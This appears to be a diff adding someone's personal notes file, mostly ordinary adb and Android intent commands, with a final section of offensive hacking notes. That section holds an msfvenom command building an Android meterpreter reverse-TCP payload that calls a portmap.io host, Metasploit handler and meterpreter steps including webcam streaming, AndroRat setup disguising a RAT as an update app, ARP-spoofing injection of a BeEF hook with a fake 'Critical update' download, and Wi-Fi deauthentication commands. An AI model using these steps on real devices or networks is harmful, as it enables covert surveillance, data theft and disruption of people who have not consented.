@@ -1,0 +1,700 @@
+https://forum.xda-developers.com/showthread.php?t=872128
+https://forum.xda-developers.com/showthread.php?t=879701
+
+am start -a android.intent.action.ALL_APPS
+ -d sms:3146567165 --es sms_body "Mensaje>"
+
+adb shell dumpsys activity -h
+
+adb shell "dumpsys activity | grep top-activity"
+
+adb shell dumpsys battery
+
+pm list packages -f
+adb shell dumpsys alarm
+
+adb shell dumpsys alarm
+
+saber informacion de una apllicacion como el momento en que se instalo
+adb shell dumpsys package com.android.chrome
+adb shell dumpsys package com.android.phone
+
+view hierarchy
+adb shell dumpsys activity top
+
+active services, recent task
+adb shell dumpsys activity
+
+am start -a android.intent.action.SENDTO -d sms:3146567165 --es sms_body "Mensaje>"
+enviar mensaje
+
+
+activity_actions.txt
+android.bluetooth.adapter.action.REQUEST_DISCOVERABLE
+android.bluetooth.adapter.action.REQUEST_ENABLE
+android.intent.action.ALL_APPS
+android.intent.action.ANSWER
+android.intent.action.ATTACH_DATA
+android.intent.action.BUG_REPORT
+android.intent.action.CALL
+android.intent.action.CALL_BUTTON
+android.intent.action.CHOOSER
+android.intent.action.CREATE_LIVE_FOLDER
+android.intent.action.CREATE_SHORTCUT
+android.intent.action.DELETE
+android.intent.action.DIAL
+android.intent.action.EDIT
+android.intent.action.GET_CONTENT
+android.intent.action.INSERT
+android.intent.action.INSERT_OR_EDIT
+android.intent.action.MAIN
+android.intent.action.MEDIA_SEARCH
+android.intent.action.PICK
+android.intent.action.PICK_ACTIVITY
+android.intent.action.POWER_USAGE_SUMMARY
+android.intent.action.RINGTONE_PICKER
+android.intent.action.RUN
+android.intent.action.SEARCH
+android.intent.action.SEARCH_LONG_PRESS
+android.intent.action.SEND
+android.intent.action.SENDTO
+android.intent.action.SEND_MULTIPLE
+android.intent.action.SET_WALLPAPER
+android.intent.action.SYNC
+android.intent.action.SYSTEM_TUTORIAL
+android.intent.action.VIEW
+android.intent.action.VOICE_COMMAND
+android.intent.action.WEB_SEARCH
+android.net.wifi.PICK_WIFI_NETWORK
+android.settings.ACCESSIBILITY_SETTINGS
+android.settings.AIRPLANE_MODE_SETTINGS
+android.settings.APN_SETTINGS
+android.settings.APPLICATION_DEVELOPMENT_SETTINGS
+android.settings.APPLICATION_SETTINGS
+android.settings.BLUETOOTH_SETTINGS
+android.settings.DATA_ROAMING_SETTINGS
+android.settings.DATE_SETTINGS
+android.settings.DISPLAY_SETTINGS
+android.settings.INPUT_METHOD_SETTINGS
+android.settings.INTERNAL_STORAGE_SETTINGS
+android.settings.LOCALE_SETTINGS
+android.settings.LOCATION_SOURCE_SETTINGS
+android.settings.MANAGE_APPLICATIONS_SETTINGS
+android.settings.MEMORY_CARD_SETTINGS
+android.settings.NETWORK_OPERATOR_SETTINGS
+android.settings.PRIVACY_SETTINGS
+android.settings.QUICK_LAUNCH_SETTINGS
+android.settings.SECURITY_SETTINGS
+android.settings.SETTINGS
+android.settings.SOUND_SETTINGS
+android.settings.SYNC_SETTINGS
+android.settings.USER_DICTIONARY_SETTINGS
+android.settings.WIFI_IP_SETTINGS
+android.settings.WIFI_SETTINGS
+android.settings.WIRELESS_SETTINGS
+android.speech.tts.engine.CHECK_TTS_DATA
+android.speech.tts.engine.INSTALL_TTS_DATA
+
+*******************standart actions
+ACTION_MAIN
+ACTION_VIEW
+ACTION_ATTACH_DATA
+ACTION_EDIT
+ACTION_PICK
+ACTION_CHOOSER
+ACTION_GET_CONTENT
+ACTION_DIAL
+ACTION_CALL
+ACTION_SEND
+ACTION_SENDTO
+ACTION_ANSWER
+ACTION_INSERT
+ACTION_DELETE
+ACTION_RUN
+ACTION_SYNC
+ACTION_PICK_ACTIVITY
+ACTION_SEARCH
+ACTION_WEB_SEARCH
+ACTION_FACTORY_TEST
+*******************************
+*******************standart actions
+
+******************************
+
+broadcast_actions.txt
+android.app.action.ACTION_PASSWORD_CHANGED
+android.app.action.ACTION_PASSWORD_EXPIRING
+android.app.action.ACTION_PASSWORD_FAILED
+android.app.action.ACTION_PASSWORD_SUCCEEDED
+android.app.action.DEVICE_ADMIN_DISABLED
+android.app.action.DEVICE_ADMIN_DISABLE_REQUESTED
+android.app.action.DEVICE_ADMIN_ENABLED
+android.app.action.DEVICE_OWNER_CHANGED
+android.app.action.INTERRUPTION_FILTER_CHANGED
+android.app.action.LOCK_TASK_ENTERING
+android.app.action.LOCK_TASK_EXITING
+android.app.action.NEXT_ALARM_CLOCK_CHANGED
+android.app.action.NOTIFICATION_POLICY_ACCESS_GRANTED_CHANGED
+android.app.action.NOTIFICATION_POLICY_CHANGED
+android.app.action.PROFILE_PROVISIONING_COMPLETE
+android.app.action.SYSTEM_UPDATE_POLICY_CHANGED
+android.bluetooth.a2dp.profile.action.CONNECTION_STATE_CHANGED
+android.bluetooth.a2dp.profile.action.PLAYING_STATE_CHANGED
+android.bluetooth.adapter.action.CONNECTION_STATE_CHANGED
+android.bluetooth.adapter.action.DISCOVERY_FINISHED
+android.bluetooth.adapter.action.DISCOVERY_STARTED
+android.bluetooth.adapter.action.LOCAL_NAME_CHANGED
+android.bluetooth.adapter.action.SCAN_MODE_CHANGED
+android.bluetooth.adapter.action.STATE_CHANGED
+android.bluetooth.device.action.ACL_CONNECTED
+android.bluetooth.device.action.ACL_DISCONNECTED
+android.bluetooth.device.action.ACL_DISCONNECT_REQUESTED
+android.bluetooth.device.action.BOND_STATE_CHANGED
+android.bluetooth.device.action.CLASS_CHANGED
+android.bluetooth.device.action.FOUND
+android.bluetooth.device.action.NAME_CHANGED
+android.bluetooth.device.action.PAIRING_REQUEST
+android.bluetooth.device.action.UUID
+android.bluetooth.devicepicker.action.DEVICE_SELECTED
+android.bluetooth.devicepicker.action.LAUNCH
+android.bluetooth.headset.action.VENDOR_SPECIFIC_HEADSET_EVENT
+android.bluetooth.headset.profile.action.AUDIO_STATE_CHANGED
+android.bluetooth.headset.profile.action.CONNECTION_STATE_CHANGED
+android.bluetooth.input.profile.action.CONNECTION_STATE_CHANGED
+android.bluetooth.pan.profile.action.CONNECTION_STATE_CHANGED
+android.hardware.action.NEW_PICTURE
+android.hardware.action.NEW_VIDEO
+android.hardware.hdmi.action.OSD_MESSAGE
+android.hardware.input.action.QUERY_KEYBOARD_LAYOUTS
+android.intent.action.ACTION_POWER_CONNECTED
+android.intent.action.ACTION_POWER_DISCONNECTED
+android.intent.action.ACTION_SHUTDOWN
+android.intent.action.AIRPLANE_MODE
+android.intent.action.APPLICATION_RESTRICTIONS_CHANGED
+android.intent.action.BATTERY_CHANGED
+android.intent.action.BATTERY_LOW
+android.intent.action.BATTERY_OKAY
+android.intent.action.BOOT_COMPLETED
+android.intent.action.CAMERA_BUTTON
+android.intent.action.CONFIGURATION_CHANGED
+android.intent.action.CONTENT_CHANGED
+android.intent.action.DATA_SMS_RECEIVED
+android.intent.action.DATE_CHANGED
+android.intent.action.DEVICE_STORAGE_LOW
+android.intent.action.DEVICE_STORAGE_OK
+android.intent.action.DOCK_EVENT
+android.intent.action.DOWNLOAD_COMPLETE
+android.intent.action.DOWNLOAD_NOTIFICATION_CLICKED
+android.intent.action.DREAMING_STARTED
+android.intent.action.DREAMING_STOPPED
+android.intent.action.EXTERNAL_APPLICATIONS_AVAILABLE
+android.intent.action.EXTERNAL_APPLICATIONS_UNAVAILABLE
+android.intent.action.FETCH_VOICEMAIL
+android.intent.action.GTALK_CONNECTED
+android.intent.action.GTALK_DISCONNECTED
+android.intent.action.HEADSET_PLUG
+android.intent.action.HEADSET_PLUG
+android.intent.action.INPUT_METHOD_CHANGED
+android.intent.action.LOCALE_CHANGED
+android.intent.action.MANAGE_PACKAGE_STORAGE
+android.intent.action.MEDIA_BAD_REMOVAL
+android.intent.action.MEDIA_BUTTON
+android.intent.action.MEDIA_CHECKING
+android.intent.action.MEDIA_EJECT
+android.intent.action.MEDIA_MOUNTED
+android.intent.action.MEDIA_NOFS
+android.intent.action.MEDIA_REMOVED
+android.intent.action.MEDIA_SCANNER_FINISHED
+android.intent.action.MEDIA_SCANNER_SCAN_FILE
+android.intent.action.MEDIA_SCANNER_STARTED
+android.intent.action.MEDIA_SHARED
+android.intent.action.MEDIA_UNMOUNTABLE
+android.intent.action.MEDIA_UNMOUNTED
+android.intent.action.MY_PACKAGE_REPLACED
+android.intent.action.NEW_OUTGOING_CALL
+android.intent.action.NEW_VOICEMAIL
+android.intent.action.PACKAGE_ADDED
+android.intent.action.PACKAGE_CHANGED
+android.intent.action.PACKAGE_DATA_CLEARED
+android.intent.action.PACKAGE_FIRST_LAUNCH
+android.intent.action.PACKAGE_FULLY_REMOVED
+android.intent.action.PACKAGE_INSTALL
+android.intent.action.PACKAGE_NEEDS_VERIFICATION
+android.intent.action.PACKAGE_REMOVED
+android.intent.action.PACKAGE_REPLACED
+android.intent.action.PACKAGE_RESTARTED
+android.intent.action.PACKAGE_VERIFIED
+android.intent.action.PHONE_STATE
+android.intent.action.PROVIDER_CHANGED
+android.intent.action.PROXY_CHANGE
+android.intent.action.REBOOT
+android.intent.action.SCREEN_OFF
+android.intent.action.SCREEN_ON
+android.intent.action.TIMEZONE_CHANGED
+android.intent.action.TIME_SET
+android.intent.action.TIME_TICK
+android.intent.action.UID_REMOVED
+android.intent.action.USER_PRESENT
+android.intent.action.WALLPAPER_CHANGED
+android.media.ACTION_SCO_AUDIO_STATE_UPDATED
+android.media.AUDIO_BECOMING_NOISY
+android.media.RINGER_MODE_CHANGED
+android.media.SCO_AUDIO_STATE_CHANGED
+android.media.VIBRATE_SETTING_CHANGED
+android.media.action.CLOSE_AUDIO_EFFECT_CONTROL_SESSION
+android.media.action.HDMI_AUDIO_PLUG
+android.media.action.OPEN_AUDIO_EFFECT_CONTROL_SESSION
+android.net.conn.BACKGROUND_DATA_SETTING_CHANGED
+android.net.conn.CONNECTIVITY_CHANGE
+android.net.nsd.STATE_CHANGED
+android.net.scoring.SCORER_CHANGED
+android.net.scoring.SCORE_NETWORKS
+android.net.wifi.NETWORK_IDS_CHANGED
+android.net.wifi.RSSI_CHANGED
+android.net.wifi.SCAN_RESULTS
+android.net.wifi.STATE_CHANGE
+android.net.wifi.WIFI_STATE_CHANGED
+android.net.wifi.p2p.CONNECTION_STATE_CHANGE
+android.net.wifi.p2p.DISCOVERY_STATE_CHANGE
+android.net.wifi.p2p.PEERS_CHANGED
+android.net.wifi.p2p.STATE_CHANGED
+android.net.wifi.p2p.THIS_DEVICE_CHANGED
+android.net.wifi.supplicant.CONNECTION_CHANGE
+android.net.wifi.supplicant.STATE_CHANGE
+android.nfc.action.ADAPTER_STATE_CHANGED
+android.os.action.DEVICE_IDLE_MODE_CHANGED
+android.os.action.POWER_SAVE_MODE_CHANGED
+android.provider.Telephony.SIM_FULL
+android.provider.Telephony.SMS_CB_RECEIVED
+android.provider.Telephony.SMS_DELIVER
+android.provider.Telephony.SMS_EMERGENCY_CB_RECEIVED
+android.provider.Telephony.SMS_RECEIVED
+android.provider.Telephony.SMS_REJECTED
+android.provider.Telephony.SMS_SERVICE_CATEGORY_PROGRAM_DATA_RECEIVED
+android.provider.Telephony.WAP_PUSH_DELIVER
+android.provider.Telephony.WAP_PUSH_RECEIVED
+android.speech.tts.TTS_QUEUE_PROCESSING_COMPLETED
+android.speech.tts.engine.TTS_DATA_INSTALLED
+
+Categories.txt
+== Adb Server
+adb kill-server
+adb start-server 
+
+== Adb Reboot
+adb reboot
+adb reboot recovery 
+adb reboot-bootloader
+
+== Shell
+adb shell    // Open or run commands in a terminal on the host Android device.
+
+== Devices
+adb usb
+adb devices   //show devices attached
+adb connect ip_address_of_device
+
+== Get device android version
+adb shell getprop ro.build.version.release 
+
+== LogCat
+adb logcat
+adb logcat -c // clear // The parameter -c will clear the current logs on the device.
+adb logcat -d > [path_to_file] // Save the logcat output to a file on the local system.
+adb bugreport > [path_to_file] // Will dump the whole device information like dumpstate, dumpsys and logcat output.
+
+== Files
+adb push [source] [destination]    // Copy files from your computer to your phone.
+adb pull [device file location] [local file location] // Copy files from your phone to your computer.
+
+== App install
+adb -e install path/to/app.apk
+
+-d                        - directs command to the only connected USB device...
+-e                        - directs command to the only running emulator...
+-s <serial number>        ...
+-p <product name or path> ...
+The flag you decide to use has to come before the actual adb command:
+
+adb devices | tail -n +2 | cut -sf 1 | xargs -IX adb -s X install -r com.myAppPackage // Install the given app on all connected devices.
+
+== Uninstalling app from device
+adb uninstall com.myAppPackage
+adb uninstall <app .apk name>
+adb uninstall -k <app .apk name> -> "Uninstall .apk withour deleting data"
+
+adb shell pm uninstall com.example.MyApp
+adb shell pm clear [package] // Deletes all data associated with a package.
+
+adb devices | tail -n +2 | cut -sf 1 | xargs -IX adb -s X uninstall com.myAppPackage //Uninstall the given app from all connected devices
+
+== Update app
+adb install -r yourApp.apk  //  -r means re-install the app and keep its data on the device.
+adb install �k <.apk file path on computer> 
+
+== Home button
+adb shell am start -W -c android.intent.category.HOME -a android.intent.action.MAIN
+
+== Activity Manager
+adb shell am start -a android.intent.action.VIEW
+adb shell am broadcast -a 'my_action'
+
+adb shell am start -a android.intent.action.CALL -d tel:+972527300294 // Make a call
+
+// Open send sms screen with phone number and the message:
+adb shell am start -a android.intent.action.SENDTO -d sms:+972527300294   --es  sms_body "Test --ez exit_on_sent false
+
+// Reset permissions
+adb shell pm reset-permissions -p your.app.package 
+adb shell pm grant [packageName] [ Permission]  // Grant a permission to an app. 
+adb shell pm revoke [packageName] [ Permission]   // Revoke a permission from an app.
+
+
+// Emulate device
+adb shell wm size 2048x1536
+adb shell wm density 288
+// And reset to default
+adb shell wm size reset
+adb shell wm density reset
+
+== Print text
+adb shell input text 'Wow, it so cool feature'
+
+== Screenshot
+adb shell screencap -p /sdcard/screenshot.png
+
+$ adb shell
+shell@ $ screencap /sdcard/screen.png
+shell@ $ exit
+$ adb pull /sdcard/screen.png
+
+---
+adb shell screenrecord /sdcard/NotAbleToLogin.mp4
+
+$ adb shell
+shell@ $ screenrecord --verbose /sdcard/demo.mp4
+(press Control + C to stop)
+shell@ $ exit
+$ adb pull /sdcard/demo.mp4
+
+== Key event
+adb shell input keyevent 3 // Home btn
+adb shell input keyevent 4 // Back btn
+adb shell input keyevent 5 // Call
+adb shell input keyevent 6 // End call
+adb shell input keyevent 26  // Turn Android device ON and OFF. It will toggle device to on/off status.
+adb shell input keyevent 27 // Camera
+adb shell input keyevent 64 // Open browser
+adb shell input keyevent 66 // Enter
+adb shell input keyevent 67 // Delete (backspace)
+adb shell input keyevent 207 // Contacts
+adb shell input keyevent 220 / 221 // Brightness down/up
+adb shell input keyevent 277 / 278 /279 // Cut/Copy/Paste
+// https://developer.android.com/reference/android/view/KeyEvent.html
+
+== ShPref
+# replace org.example.app with your application id
+
+# Add a value to default shared preferences.
+adb shell 'am broadcast -a org.example.app.sp.PUT --es key key_name --es value "hello world!"'
+
+# Remove a value to default shared preferences.
+adb shell 'am broadcast -a org.example.app.sp.REMOVE --es key key_name'
+
+# Clear all default shared preferences.
+adb shell 'am broadcast -a org.example.app.sp.CLEAR --es key key_name'
+
+# It's also possible to specify shared preferences file.
+adb shell 'am broadcast -a org.example.app.sp.PUT --es name Game --es key level --ei value 10'
+
+# Data types
+adb shell 'am broadcast -a org.example.app.sp.PUT --es key string --es value "hello world!"'
+adb shell 'am broadcast -a org.example.app.sp.PUT --es key boolean --ez value true'
+adb shell 'am broadcast -a org.example.app.sp.PUT --es key float --ef value 3.14159'
+adb shell 'am broadcast -a org.example.app.sp.PUT --es key int --ei value 2015'
+adb shell 'am broadcast -a org.example.app.sp.PUT --es key long --el value 9223372036854775807'
+
+# Restart application process after making changes
+adb shell 'am broadcast -a org.example.app.sp.CLEAR --ez restart true'
+
+== Monkey
+adb shell monkey -p com.myAppPackage -v 10000 -s 100 // monkey tool is generating 10.000 random events on the real device
+
+
+== Other
+adb backup // Create a full backup of your phone and save to the computer.
+adb restore // Restore a backup to your phone.
+adb sideload //  Push and flash custom ROMs and zips from your computer.
+
+fastboot devices
+// Check connection and get basic information about devices connected to the computer.
+// This is essentially the same command as adb devices from earlier. 
+//However, it works in the bootloader, which ADB does not. Handy for ensuring that you have properly established a connection.
+
+
+--------------------------------------------------------------------------------
+Shared Preferences
+
+# replace org.example.app with your application id
+
+# Add a value to default shared preferences.
+adb shell 'am broadcast -a org.example.app.sp.PUT --es key key_name --es value "hello world!"'
+
+# Remove a value to default shared preferences.
+adb shell 'am broadcast -a org.example.app.sp.REMOVE --es key key_name'
+
+# Clear all default shared preferences.
+adb shell 'am broadcast -a org.example.app.sp.CLEAR --es key key_name'
+
+# It's also possible to specify shared preferences file.
+adb shell 'am broadcast -a org.example.app.sp.PUT --es name Game --es key level --ei value 10'
+
+# Data types
+adb shell 'am broadcast -a org.example.app.sp.PUT --es key string --es value "hello world!"'
+adb shell 'am broadcast -a org.example.app.sp.PUT --es key boolean --ez value true'
+adb shell 'am broadcast -a org.example.app.sp.PUT --es key float --ef value 3.14159'
+adb shell 'am broadcast -a org.example.app.sp.PUT --es key int --ei value 2015'
+adb shell 'am broadcast -a org.example.app.sp.PUT --es key long --el value 9223372036854775807'
+
+# Restart application process after making changes
+adb shell 'am broadcast -a org.example.app.sp.CLEAR --ez restart true'
+--------------------------------------------------------------------------------
+
+=== Few bash snippets ===
+@Source (https://jonfhancock.com/bash-your-way-to-better-android-development-1169bc3e0424)
+
+=== Using tail -n
+//Use tail to remove the first line. Actually two lines. The first one is just a newline. The second is �List of devices attached.�
+$ adb devices | tail -n +2
+
+=== Using cut -sf
+// Cut the last word and any white space off the end of each line.
+$ adb devices | tail -n +2 | cut -sf -1
+
+=== Using xargs -I
+// Given the -I option, xargs will perform an action for each line of text that we feed into it.
+// We can give the line a variable name to use in commands that xargs can execute.
+$ adb devices | tail -n +2 | cut -sf -1 | xargs -I X echo X aw yiss
+
+=== Three options below together
+// Will print android version of all connected devices
+adb devices | tail -n +2 | cut -sf -1 | xargs -I X adb -s X shell getprop ro.build.version.release  
+
+=== Using alias
+-- Example 1 
+alias tellMeMore=echo
+tellMeMore "hi there"
+Output => hi there
+-- Example 2
+// Define alias
+alias apkinstall="adb devices | tail -n +2 | cut -sf 1 | xargs -I X adb -s X install -r $1"
+// And you can use it later 
+apkinstall ~/Downloads/MyAppRelease.apk  // Install an apk on all devices
+-- Example 3
+alias rmapp="adb devices | tail -n +2 | cut -sf 1 | xargs -I X adb -s X uninstall $1"
+rmapp com.example.myapp // Uninstall a package from all devices
+-- Example 4
+alias clearapp="adb devices | tail -n +2 | cut -sf 1 | xargs -I X adb -s X shell pm clear $1"
+clearapp com.example.myapp  // Clear data on all devices (leave installed)
+-- Example 5
+alias startintent="adb devices | tail -n +2 | cut -sf 1 | xargs -I X adb -s X shell am start $1"
+startintent https://twitter.com/JonFHancock // Launch a deep link on all devices
+
+
+Setting up your .bash_profile
+Finally, to make this all reusable even after rebooting your computer (aliases only last through the current session), we have to add these to your .bash_profile. You might or might not already have a .bash_profile, so let�s make sure we append to it rather than overwriting it. Just open a terminal, and run the following command
+
+touch .bash_profile && open .bash_profile
+
+This will create it if it doesn�t already exist, and open it in a text editor either way. Now just copy and paste all of the aliases into it, save, and close.
+
+alias startintent="adb devices | tail -n +2 | cut -sf 1 | xargs -I X adb -s X shell am start $1"
+alias apkinstall="adb devices | tail -n +2 | cut -sf 1 | xargs -I X adb -s X install -r $1"
+alias rmapp="adb devices | tail -n +2 | cut -sf 1 | xargs -I X adb -s X uninstall $1"
+alias clearapp="adb devices | tail -n +2 | cut -sf 1 | xargs -I X adb -s X shell pm clear $1"
+
+---------------------
+adb reverse tcp:8000 tcp:3000
+Now when your phone tries to access http://localhost:8000/ the request will be routed to localhost:3000 of your laptop.
+
+---------------------------
+adb shell dumpsys batterystats
+adb shell dumpstate > state.logs
+adb shell dumpsys cpuinfo
+adb shell dumpsys wifi
+adb shell dumpsys meminfo 'your apps package name'
+adb shell dumpsys meminfo --local
+adb shell dumpsys | grep DUMP
+	account
+	
+
+
+
+
+
+
+
+
+
+
+----------------------------------------------
+comandos utiles
+Lista de comandos	
+Reiniciar el dispositivo	reboot
+Apagar el dispositivo	poweroff
+Reinciar en modo recovery	reboot recovery	
+Reiniciar en modo download	reboot download
+Intentar forzar la instalación de aplicaciones en la tarjeta SD	pm setInstallLocation 2
+Comprobar la ruta actual de instalación	pm getInstallLocation
+Montar la partición de sistema como lectura / escritura (usar con precaución)	mount -o rw,remount -t /system
+Si el comando anterior no funciona, podemos usar este otro	mount -o rw,remount -t ext3 /dev/block/mmcblk1p21 /system
+Desmontar la partición de sistema en modo lectura / escritura	mount -o ro,remount -t /system
+Si no funciona podemos probar con este comando	mount -o ro,remount -t ext3 /dev/block/mmcblk1p21 /system
+Mover archivos o directorios de la tarjeta SD al sistema usando Busybox	busybox cp /sdcard/”path” /system/”path” donde path es la ruta en la que se encuentra dicho directorio o archivo
+Cambiar los permisos de un directorio o un archivo a rw-r–r– –lectura y escritura para el administrador, lectura para el propietario y lectura para el usuario invitado– después de montar la partición de sistema como lectura / escritura	chmod 644 “path”
+Cambiar de directorio	cd “path”. Path es la ruta en la que se encuentra dicho directorio
+Obtener una lista de todos los directorios y archivos de una ruta en la que nos encontremos	ls
+Crear un directorio en una ruta concreta	mkdir “path”
+Elminar un archivo	rm “path” donde path es la ruta del archivo
+Elminar un directorio	rmdir “path” donde path es la ruta del directorio
+
+
+adb shell am start -n it.sendto.android.client/.MainActivity
+You can add other parameters like ACTION (-a android.intent.action.MAIN) and CATEGORY (-c android.intent.category.LAUNCHER).
+
+https://developer.android.com/guide/components/activities?hl=es-419
+
+
+youtube-dl -o '%(uploader)s/%(playlist)s/%(playlist_index)s - %(title)s.%(ext)s' -f 'bestvideo[height<=480]+bestaudio/best[height<=480]' https://www.youtube.com/watch?v=ScQp-zP6yGA&list=PLCSyEKgwSqEEfADIjtbyXH3XuI6pi1wUG
+https://www.youtube.com/watch?v=4nozOULqIEk&list=PLCSyEKgwSqEEfADIjtbyXH3XuI6pi1wUG&index=7
+https://www.youtube.com/channel/UC-qM4Yx4a3SgkaVsITguIXA/playlists
+
+check_root
+activity_start
+dump_calllog
+dump_contacts
+dump_sms
+geolocate
+hide_app_icon
+interval_collect
+send_sms
+set_audio_mode
+sqlite_query
+waelock
+wlan_geolocate
+
+hide_app_icon
+
+meterpreter > ?
+
+msfvenom -p android/meterpreter/reverse_tcp lhost=abcdz-50604.portmap.io lport=50604 > /root/Desktop/payload.apk
+service postgresql start
+msfconsole            --- startting metasploid
+use  exploid/multi/handler               > set payload android/meterpreter/reverse_tcp
+
+
+> set lhost 10.9.10.102
+> set lport 4444
+> exploid -j
+
+SESSIONS
+	meterpreter
+> exploid -j
+
+meterpreter > sysinfo
+cd system 		cat build.prop		producto.model=
+
+
+
+https://www.youtube.com/watch?v=VgGLDgEb234
+Android Hacked - Remotely 2018 [ Proof - 100% Working ]
+descargar AndroRat -- C:\Users\preci\Documents\jeisson\hackVideo 
+
+create account noip.com
+add hostname
+dashboard - dynamic update client microsoft - download
+
+network map - network infrastructure (1)
+propieties --> advanceSettings --> services --> 
+	mytcp && myudp
+	mi ip v4
+	external port TCP 81 --> 81
+
+open DUC we downloaded
+sign in . correo , contraseña
+
+iniciar AndroRat binder
+id -- ddns
+port 81
+apk tittle updateExample
+
+https://www.udemy.com/learn-ethical-hacking-from-scratch/?gclid=CjwKCAiAyfvhBRBsEiwAe2t_i5W-9wwiRPAAx9BraQoq7NpIRII80BV72bZdV-ifCkrFph2CWskljBoCjIMQAvD_BwE&utm_campaign=ROW-YT-PROS-TECH-TOP-Ethical-T2-EN-ALL_._ci_857010_._sl_ALL_._vi_TECH_._sd_All_._la_EN_._&utm_content=Overlay&utm_medium=udemyads&utm_source=youtube-row&utm_term=_._ag_56270499118_._ad_268514877732_._de_c_._dm__._pl_youtube.com_._ti__._li_1003659_._pd__._
+
+******************************************
+abrir camara en windows
+beef
+mitmf --arp --snoof -i eth0 --gateway 10.20.14.1 --tarjet 10.20.14.217 --inject --js-url http://10.20.14.213:3000/hook.js
+
+kali machine . 
+127.0.0.1:3000/ui/panel
+www.bing.com
+    commands
+fake notification bar firefox
+notification text Critical update click here to install 
+plugin URL http://10.20.14.213/update.exe
+
+msfconsole -r /var/lib/veil-evasion/output/handlers/evo_handler.rc
+
+msf exploit(handler) > sessions -l
+*sesion de windows machine
+msf > sessions -i 1
+
+meterpreter sysinfo
+meterpreter > webcam_stream
+
+registrador de teclas
+
+
+wireshark
+edit --> preferences --> arp/rarp "detect" 
+arp spoof ing enabled
+netdiscover -i eth0 -r 10.20.14.1/24
+
+quien esta haciendo peticion en cualquier ip - y digale a la ip mia
+analize expert information
+
+mitmf --arp --snoof -i eth0 --gateway 10.20.14.1 --tarjet 10.20.14.206 -i eth0
+
+windows terminal > arp -a
+
+
+desonectar dispositivo de la wifi
+airmon-ng
+airmon-ng start wlan0
+airmon-ng check kill
+airodump-ng wlan0mon
+
+su 
+airodump-ng -c 1 -w kill -bssid 02:08:22:16:FE:A9 wlan0mon 
+
+other terminal
+aireplay-ng -0 0 -c 50.55.27.B7:D4:CB -a 02:08:22:16:FE:A9 wlan0mon
+aireplay-ng -0 0 -a 02:08:22:16:FE:A9 wlan0mon
+
+airmon-ng stop wlan0mon
+(driver iwlwifi)
+
+
+mquinas virtuales. 
+kali 2016           red, nat network :  10.20.14-NAT
+metasploitable      red, nat network :  10.20.14-NAT
+
+
+
+https://www.youtube.com/watch?v=3ZZ04i5O_H4&list=PLVTVBRJ3ABO84ne3bRjWxHEVom5xa6GFx&index=6
+How to remotely access Android phone using another Android phone || hindi tutorial
+
+termux > ls
+metasploid metasploid-framework
+cd metasploid-framework --> permisos Gemfile Rakefile msfconsole msfd msfrpc msfrpcd msfupdate msfvenom
+
